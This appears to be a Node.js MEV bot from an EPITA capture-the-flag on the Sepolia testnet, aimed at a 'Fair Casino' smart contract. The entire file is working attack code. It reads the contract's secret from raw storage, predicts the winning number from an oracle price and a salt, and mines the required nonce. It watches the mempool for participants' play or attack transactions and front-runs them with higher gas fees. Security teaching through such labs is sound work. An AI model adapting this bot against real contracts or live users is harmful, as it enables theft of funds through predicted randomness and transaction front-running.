/**
 * ╔══════════════════════════════════════════════════════════╗
 * ║  MEV BOT — FAIR CASINO — CTF EPITA — Sepolia            ║
 * ║  Pre-calcule winningNumber + nonce à l'avance            ║
 * ║  Frontrun instantané quand une tx étudiant est détectée ║
 * ╚══════════════════════════════════════════════════════════╝
 *
 * Run: node scripts/mev/mev-bot.mjs
 */

import dotenv from "dotenv";
dotenv.config();

import { ethers } from "ethers";

const BOT_KEY      = process.env.PRIVATE_KEY_2;
const WS_RPC       = process.env.WS_RPC_URL
    || process.env.RPC_URL.replace("https://", "wss://").replace(/\/v3\//, "/ws/v3/");
const HTTP_RPC     = process.env.RPC_URL;
const CASINO_ADDR  = process.env.CASINO_ADDRESS;
const GAME_SALT    = BigInt(process.env.GAME_SALT);
const EXPLORER     = "https://sepolia.etherscan.io";
const CHAIN_ID     = 11155111;

const FALLBACK_HTTP = [
    HTTP_RPC,
    "https://sepolia.drpc.org",
    "https://ethereum-sepolia-rpc.publicnode.com",
    "https://gateway.tenderly.co/public/sepolia",
    "https://0xrpc.io/sep",
    "https://1rpc.io/sepolia",
].filter(Boolean);

const FALLBACK_WS = [
    WS_RPC,
    "wss://sepolia.drpc.org",
    "wss://ethereum-sepolia-rpc.publicnode.com",
    "wss://sepolia.gateway.tenderly.co",
    "wss://0xrpc.io/sep",
].filter(Boolean);

const SLOT_SECRET_TARGET = 5;

const CASINO_ABI = [
    "function currentRound() external view returns (uint256)",
    "function priceOracle() external view returns (address)",
    "function jackpotReserve() external view returns (uint256)",
    "function profitPool() external view returns (uint256)",
];
const ORACLE_ABI = [
    "function latestRoundData() external view returns (uint80,int256,uint256,uint256,uint80)",
];

const ATTACK_SEL = ethers.id("attack(uint256,uint256,uint256)").slice(2, 10); // IDrainer (Drainer + DrainerOnChain)
const PLAY_SEL   = ethers.id("play(uint256,uint256,uint256)").slice(2, 10);
const WATCHED    = new Set([ATTACK_SEL, PLAY_SEL]);

let botAddress = null;  // ← Address publique du bot

const color = {
    dim:    s => `\x1b[2m${s}\x1b[0m`,
    green:  s => `\x1b[32m${s}\x1b[0m`,
    red:    s => `\x1b[31m${s}\x1b[0m`,
    cyan:   s => `\x1b[36m${s}\x1b[0m`,
    yellow: s => `\x1b[33m${s}\x1b[0m`,
    bold:   s => `\x1b[1m${s}\x1b[0m`,
};
const ts   = () => new Date().toISOString().slice(11, 19);
const log  = (icon, fn, msg) => console.log(`${color.dim(ts())}  ${fn(icon)}  ${msg}`);
const info = m => log("ℹ️  INFO  ", color.cyan,   m);
const warn = m => log("⚠️  WARN  ", color.yellow, m);
const ok   = m => log("✅ OK     ", color.green,  m);
const atk  = m => log("⚡ SNIPER ", color.yellow, m);
const link = url => `\x1b[4m\x1b[36m${url}\x1b[0m`;

// ═══════════════════════════════════════════════════════════════
// CACHE — pré-calculé en arrière-plan
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
// HTTP PROVIDER POOL — rotation séquentielle sur rate-limit/erreur
// ═══════════════════════════════════════════════════════════════

const HTTP_POOL = FALLBACK_HTTP.map(
    url => new ethers.JsonRpcProvider(url, CHAIN_ID, { staticNetwork: true })
);
let httpIdx  = 0;
let httpBot  = null; // module-level wallet, rebind on rotate

function getHttp() { return HTTP_POOL[httpIdx]; }

function rotateHttp(reason) {
    const prev = FALLBACK_HTTP[httpIdx];
    httpIdx = (httpIdx + 1) % HTTP_POOL.length;
    warn(`HTTP rotated (${prev.slice(8, 40)}…): ${String(reason).slice(0, 50)}`);
    info(`HTTP now: ${FALLBACK_HTTP[httpIdx]}`);
    if (cachedOracle) cachedOracle = cachedOracle.connect(getHttp());
    if (httpBot)      httpBot = new ethers.Wallet(BOT_KEY, getHttp());
}

let cachedSecretTarget  = null;
let cachedOracle        = null;
let cachedRound         = null;
let cachedPrice         = null;
let cachedWinningNumber = null;
let cachedNonce         = null;
let lastUpdate          = 0;
let prevWinningNumber   = null;

async function initCache() {
    botAddress = httpBot.address.toLowerCase();
    for (let i = 0; i < HTTP_POOL.length; i++) {
        try {
            const http = getHttp();
            cachedSecretTarget = BigInt(await http.getStorage(CASINO_ADDR, SLOT_SECRET_TARGET));
            const casino   = new ethers.Contract(CASINO_ADDR, CASINO_ABI, http);
            const oracleAddr = await casino.priceOracle();
            cachedOracle   = new ethers.Contract(oracleAddr, ORACLE_ABI, http);
            await updateCache();
            ok(`Cache initialisé: round=${cachedRound}, nonce=${cachedNonce}`);
            return;
        } catch (e) {
            rotateHttp(e.message);
        }
    }
    throw new Error("initCache: tous les providers HTTP ont échoué");
}

async function updateCache() {
    let lastErr;
    for (let attempt = 0; attempt < HTTP_POOL.length; attempt++) {
        try {
            const t0   = Date.now();
            const http = getHttp();

            const [round, priceData] = await Promise.all([
                new ethers.Contract(CASINO_ADDR, ["function currentRound() view returns (uint256)"], http).currentRound(),
                cachedOracle.latestRoundData(),
            ]);

            cachedRound = round;
            cachedPrice = priceData[1];

            const newWinningNumber = BigInt(ethers.solidityPackedKeccak256(
                ["uint256", "uint256", "uint256"],
                [cachedSecretTarget ^ BigInt(cachedPrice.toString()), GAME_SALT, cachedRound]
            ));
            cachedWinningNumber = newWinningNumber;

            // Only mine nonce when winningNumber changes (round or price change).
            // Mining is CPU-intensive (~9s) and blocks the event loop.
            if (newWinningNumber !== prevWinningNumber) {
                prevWinningNumber = newWinningNumber;
                const t1 = Date.now();
                cachedNonce = mineNonceCached(botAddress, cachedRound, cachedWinningNumber);
                const t2 = Date.now();
                info(`[WIN# CHANGED] round=${cachedRound}, nonce=${cachedNonce} (mine: ${t2-t1}ms, total: ${t2-t0}ms)`);
            }

            lastUpdate = Date.now();
            return;
        } catch (e) {
            lastErr = e;
            rotateHttp(e.message);
        }
    }
    warn(`Cache update failed after all providers: ${lastErr?.message?.slice(0, 50)}`);
}

function mineNonceCached(sender, round, winningNumber) {
    const target = 0xbeefn;
    const t0 = Date.now();
    for (let n = 0; n < 500000; n++) {
        const hash = ethers.solidityPackedKeccak256(
            ["address", "uint256", "uint256", "uint256"],
            [sender, n, winningNumber, round]
        );
        if (BigInt("0x" + hash.slice(-4)) === target) {
            const elapsed = Date.now() - t0;
            info(`Nonce mined: ${n} (${elapsed}ms)`);
            return n;
        }
    }
    warn("Failed to mine nonce in 500k iterations");
    return null;
}

async function frontrun(victimTx) {
    if (cachedNonce === null || cachedRound === null || cachedWinningNumber === null) {
        warn("Cache not ready — skipping frontrun");
        return;
    }

    const data = new ethers.Interface([
        "function play(uint256 guess, uint256 round, uint256 nonce) external payable",
    ]).encodeFunctionData("play", [cachedWinningNumber, cachedRound, cachedNonce]);

    const victimTip    = victimTx.maxPriorityFeePerGas ?? 1_000_000_000n;
    const victimMaxFee = victimTx.maxFeePerGas         ?? 10_000_000_000n;

    return httpBot.sendTransaction({
        to:                   CASINO_ADDR,
        data,
        value:                ethers.parseEther("0.01"),
        maxPriorityFeePerGas: victimTip    + 3_000_000_000n,
        maxFeePerGas:         victimMaxFee + 5_000_000_000n,
        gasLimit:             200_000,
        chainId:              CHAIN_ID,
    });
}

// Holds the active WS reconnect callback so the unhandledRejection handler can reach it.
// ethers v6 throws -32005 subscription errors as unhandled rejections instead of emitting
// them as events — catching at process level is the only reliable intercept point.
let _wsReconnect = null;

process.on("unhandledRejection", (err) => {
    // ethers v6 throws -32005 (Too Many Requests) from eth_subscribe as an unhandled
    // rejection — sometimes twice for the same event. Always swallow it; reconnect()
    // is guarded by a `reconnected` flag so it only fires once per provider instance.
    if (err?.error?.code === -32005) {
        if (_wsReconnect) _wsReconnect(err.shortMessage ?? err.message ?? "rate limited");
        return;
    }
    throw err;
});

const inFlight = new Set();
let count = 0;

async function onPendingTx(txHash) {
    if (inFlight.has(txHash)) return;
    inFlight.add(txHash);
    try {
        const tx = await getHttp().getTransaction(txHash);
        if (!tx || !tx.data || tx.data.length < 10) return;

        const sel = tx.data.slice(2, 10).toLowerCase();
        if (!WATCHED.has(sel)) return;
        if (sel === PLAY_SEL && tx.to?.toLowerCase() !== CASINO_ADDR.toLowerCase()) return;
        if (tx.from?.toLowerCase() === botAddress) return;

        count++;
        const detectTime = Date.now();
        atk(`Attack #${count} — tx ${txHash.slice(0, 14)}... — SNIPERING...`);

        frontrun(tx)
            .then(r => {
                const totalTime = Date.now() - detectTime;
                ok(`Frontrun sent (${totalTime}ms): ${link(`${EXPLORER}/tx/${r.hash}`)}`);
            })
            .catch(e => warn(`Frontrun failed: ${e.message?.slice(0, 80)}`));
    } catch (_) {
    } finally {
        inFlight.delete(txHash);
    }
}

function connectWs(urls, index) {
    const url = urls[index];
    info(`WS connecting: ${url}`);
    const ws = new ethers.WebSocketProvider(url);

    let reconnected = false;
    const reconnect = (reason) => {
        if (reconnected) return;
        reconnected = true;
        _wsReconnect = null;
        warn(`WS disconnected (${url}): ${String(reason).slice(0, 60)} — trying next`);
        try { ws.destroy(); } catch (_) {}
        setTimeout(() => connectWs(urls, (index + 1) % urls.length), 1000);
    };

    _wsReconnect = reconnect;
    ws.on("pending", txHash => onPendingTx(txHash));
    ws.on("error",   e => reconnect(e.message));

    const raw = ws._websocket ?? ws.websocket;
    if (raw) {
        raw.on("error", e => reconnect(e.message));
        raw.on("close", () => reconnect("close"));
    }
}

async function main() {
    if (!BOT_KEY)     { console.error("Missing PRIVATE_KEY_2");  process.exit(1); }
    if (!CASINO_ADDR) { console.error("Missing CASINO_ADDRESS"); process.exit(1); }
    if (!GAME_SALT)   { console.error("Missing GAME_SALT");      process.exit(1); }

    console.log(color.bold(color.yellow("\n╔══════════════════════════════════════╗")));
    console.log(color.bold(color.yellow("║  MEV BOT — FAIR CASINO — SNIPER      ║")));
    console.log(color.bold(color.yellow("╚══════════════════════════════════════╝\n")));

    httpBot = new ethers.Wallet(BOT_KEY, getHttp());

    await initCache();

    info(`Bot:    ${color.bold(httpBot.address)}`);
    info(`Casino: ${color.bold(CASINO_ADDR)}`);
    console.log();

    setInterval(() => updateCache(), 3000);

    info(color.bold(color.cyan("══ LISTENING ══")));

    connectWs(FALLBACK_WS, 0);
}

main().catch(e => { console.error(e); process.exit(1); });